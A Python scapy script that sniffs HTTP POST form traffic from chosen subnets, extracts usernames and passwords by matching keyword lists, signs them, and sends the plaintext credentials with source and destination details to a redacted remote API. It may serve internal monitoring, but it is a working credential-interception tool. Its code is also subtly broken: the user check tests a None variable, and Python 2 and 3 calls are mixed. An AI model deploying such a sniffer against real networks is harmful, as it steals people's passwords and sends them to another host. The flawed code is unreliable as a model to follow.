# pylint: disable=C0103, C0301, C0325
import base64
import itertools
import json
import logging
import urllib

import requests
from OpenSSL import crypto
from requests.exceptions import ConnectionError

from scapy.all import *  # NOQA: F403

try:
    import scapy_http.http  # NOQA: F401
except ImportError:
    # complicated because this layer was originally a third-party addin, but now
    # included.
    from scapy.layers import http  # NOQA: F401

import constants

"""
DO NOT deploy with logging.DEBUG or passwords will be logged to the configured
destination! This is a bad thing! Change the following line to change log verbosity
"""
logging.basicConfig(filename="sniffer.log", filemode="w", level=logging.INFO)
logger = logging.getLogger(__name__)

APIURI = "https://lol.nope/redacted"
INFRA_CLIENT_ID = "ALSO-REDACT"


def load_private_key():
    """Load the private key."""
    key_file = open("private.pem", "r")
    shakey = key_file.read()
    key_file.close()
    if shakey.startswith("-----BEGIN "):
        return crypto.load_privatekey(crypto.FILETYPE_PEM, shakey)
    else:
        return crypto.load_pkcs12(shakey).get_privatekey()


def _parse_password_and_user(passw, userstr, splitified_str):
    """Attempt to parse password and user from string."""
    user_rip = None
    pass_rip = None
    if passw in splitified_str:
        pass_rip = (
            urllib.unquote(splitified_str.split(passw)[1].split("&")[0])
            .encode("utf-8")
            .strip()
        )
    if user_rip in splitified_str:
        user_rip = (
            urllib.unquote(splitified_str.split(userstr)[1].split("&")[0])
            .encode("utf-8")
            .strip()
        )
    return pass_rip, user_rip


def _packet_handler(pkt):
    """Handle the packet."""
    if pkt[2][1].Method != "POST":
        return
    if getattr(pkt[2][1], "Content-Type") != "application/x-www-form-urlencoded":
        return
    raw_form = bytes(pkt[2][2])
    pkey = load_private_key()
    splitified = raw_form.split("\r\n\r\n")
    password_and_users = itertools.product(constants.PASSLIST, constants.USERLIST)
    for passw, userstr in password_and_users:
        pass_rip, user_rip = _parse_password_and_user(passw, userstr, splitified[1])
        if pass_rip and user_rip:
            src_ip = pkt[IP].src  # NOQA: F405
            dest_ip = pkt[IP].dst  # NOQA: F405
            url = (pkt[2][1].Host + pkt[2][1].Path,)
            json_data = {
                "username": user_rip,
                "password": pass_rip,
                "destination_ip": dest_ip,
                "destination_port": pkt[TCP].dport,  # NOQA: F405
                "service": "http",
                "url": url,
            }
            json_parsed_results = json.dumps(json_data)
            signature_base64 = base64.b64encode(
                crypto.sign(pkey, json_parsed_results, "sha256")
            )
            signature = (
                f"SHA256 Credential={INFRA_CLIENT_ID},Signature={signature_base64}"
            )
            post_headers = {
                "Content-Type": "application/json",
                "Connection": "close",
                "Authorization": signature,
            }
            msg = f"Password sniffed; Source: {src_ip}"
            msg += f"u: {user_rip}, dest: {dest_ip}, url {url}"
            logger.info(msg)
            res = requests.post(APIURI, data=json_parsed_results, headers=post_headers)
            logger.info("API response was: " + str(res))


def packet_handler(pkt):
    """Process the packet."""
    try:
        _packet_handler(pkt)
    except (IndexError, AttributeError) as e:
        logger.error(e)
    except ConnectionError:
        msg = "Failed to connect to infra apps endpoint; Continuing, but previous request has been discarded!"  # NOQA: E501
        logger.error(msg)


def main():
    """Execute main function of file.

    scapy filters uses BPF filters on an intel nic which is compiled to bytecode
    on the nic and as a result is very fast but behaviour on other platforms may
    be "undefined"
    """
    packet_filter = "tcp port 80 and (src net xxx.xxx.xxx.xxx mask xxx.xxx.0.0 or src net xxx.xxx.0.0 mask xxx.xxx.0.0)"  # NOQA: E501
    results = sniff(  # NOQA: F405
        iface="enp10s0", prn=packet_handler, filter=packet_filter, store=0
    )
    print(results)  # just to see how many packets are dropping


if __name__ == "__main__":
    main()
